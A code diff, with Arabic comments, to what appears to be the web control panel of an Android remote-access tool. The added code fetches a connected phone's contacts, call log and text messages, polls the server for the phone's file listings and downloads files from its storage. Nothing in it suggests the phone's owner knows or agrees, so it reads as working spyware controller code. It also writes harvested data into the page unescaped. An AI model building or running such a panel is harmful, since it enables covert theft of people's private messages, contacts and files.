@@ -1,5 +1,6 @@
 let currentDeviceId = '';
 let currentDirectory = '/storage/emulated/0/';
+let fileListPollingInterval = null;
 
 function switchTab(tabName) {
     document.querySelectorAll('.tab-pane').forEach(el => el.classList.remove('active'));
@@ -30,6 +31,15 @@ function fetchDevices() {
             statusDiv.style.color = '#00ffcc';
             statusDiv.textContent = '● متصل بنجاح';
             
+            // جلب بيانات الجهاز وعرضها
+            fetch(`/api/data/${currentDeviceId}`)
+                .then(res => res.json())
+                .then(data => {
+                    document.getElementById('contactsContent').innerHTML = data.contacts && data.contacts.length ? data.contacts.join('<br>') : 'لا توجد بيانات';
+                    document.getElementById('callsContent').innerHTML = data.calls && data.calls.length ? data.calls.join('<br>') : 'لا توجد بيانات';
+                    document.getElementById('messagesContent').innerHTML = data.messages && data.messages.length ? data.messages.join('<br>') : 'لا توجد بيانات';
+                }).catch(err => console.error("Error fetching data:", err));
+            
             // تحميل المسار الافتراضي إذا لم يتم تحميله
             if (!document.getElementById('fileListContainer').innerHTML.trim()) {
                 openPath(currentDirectory);
@@ -50,52 +60,63 @@ function changeDevice() {
     openPath('/storage/emulated/0/');
 }
 
-// فتح مسار في مدير الملفات
+// ** فتح مسار في مدير الملفات **
 function openPath(path) {
     currentDirectory = path;
     document.getElementById('currentPath').textContent = path;
     document.getElementById('fileListContainer').innerHTML = '<div style="color: var(--muted);">جاري جلب الملفات... يرجى الانتظار...</div>';
 
+    // إرسال طلب تصفح الملفات إلى الخادم
     fetch('/api/filemanager/list', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ deviceId: currentDeviceId, path: path })
     })
     .then(res => res.json())
-    .then(data => {
-        const container = document.getElementById('fileListContainer');
-        container.innerHTML = '';
-        
-        // إظهار المجلدات الجذرية الافتراضية إذا كانت القائمة فارغة
-        let files = data.files || [
-            { name: "Download", isDirectory: true, path: "/storage/emulated/0/Download/", size: "-" },
-            { name: "DCIM", isDirectory: true, path: "/storage/emulated/0/DCIM/", size: "-" },
-            { name: "SDCard", isDirectory: true, path: "/storage/sdcard1/", size: "-" }
-        ];
-
-        files.forEach(file => {
-            let item = document.createElement('div');
-            item.className = 'file-item';
-            
-            if (file.isDirectory) {
-                item.innerHTML = `<div class="file-info"><span>📁 ${file.name}</span><span class="file-size">مجلد</span></div>`;
-                item.onclick = () => openPath(file.path);
-            } else {
-                let sizeFormatted = formatBytes(file.size || 0);
-                item.innerHTML = `
-                    <div class="file-info">
-                        <span>📄 ${file.name}</span>
-                        <span class="file-size">${sizeFormatted}</span>
-                    </div>
-                    <button class="download-btn" onclick="downloadFile('${file.path}', event)">تحميل</button>
-                `;
-            }
-            container.appendChild(item);
-        });
+    .then(() => {
+        // بدء الاستعلام الدوري لنتيجة تصفح الملفات
+        if (fileListPollingInterval) clearInterval(fileListPollingInterval);
+        fileListPollingInterval = setInterval(() => {
+            fetch(`/api/filemanager/result/${currentDeviceId}`)
+            .then(res => res.json())
+            .then(data => {
+                if (data.files && data.files.length > 0) {
+                    clearInterval(fileListPollingInterval);
+                    displayFiles(data.files);
+                }
+            })
+            .catch(err => console.error("Error fetching file list result:", err));
+        }, 2000); // استعلام كل ثانيتين
     })
     .catch(err => {
         console.error("Error:", err);
-        document.getElementById('fileListContainer').innerHTML = '<div style="color: var('--danger');">فشل الاتصال بالهاتف أو جلب الملفات.</div>';
+        document.getElementById('fileListContainer').innerHTML = '<div style="color: var(--danger);">فشل الاتصال بالهاتف.</div>';
+    });
+}
+
+// ** عرض الملفات في الواجهة **
+function displayFiles(files) {
+    const container = document.getElementById('fileListContainer');
+    container.innerHTML = '';
+    
+    files.forEach(file => {
+        let item = document.createElement('div');
+        item.className = 'file-item';
+        
+        if (file.isDirectory) {
+            item.innerHTML = `<div class="file-info"><span>📁 ${file.name}</span><span class="file-size">مجلد</span></div>`;
+            item.onclick = () => openPath(file.path);
+        } else {
+            let sizeFormatted = formatBytes(file.size || 0);
+            item.innerHTML = `
+                <div class="file-info">
+                    <span>📄 ${file.name}</span>
+                    <span class="file-size">${sizeFormatted}</span>
+                </div>
+                <button class="download-btn" onclick="downloadFile('${file.path}', event)">تحميل</button>
+            `;
+        }
+        container.appendChild(item);
     });
 }
 
@@ -110,7 +131,7 @@ function goBack() {
     }
 }
 
-// دالة تحميل الملفات وعرض الحجم بدقة
+// ** تحميل ملف (سيتم تطويره لاحقاً) **
 function downloadFile(filePath, event) {
     event.stopPropagation();
     alert("جاري تحضير ملف التحميل: " + filePath);
@@ -123,7 +144,7 @@ function downloadFile(filePath, event) {
     .then(data => {
         if(data.ok && data.data) {
             let link = document.createElement('a');
-            link.href = data.data; // رابط Base64 أو رابط مباشر
+            link.href = data.data;
             link.download = filePath.split('/').pop();
             link.click();
         } else {
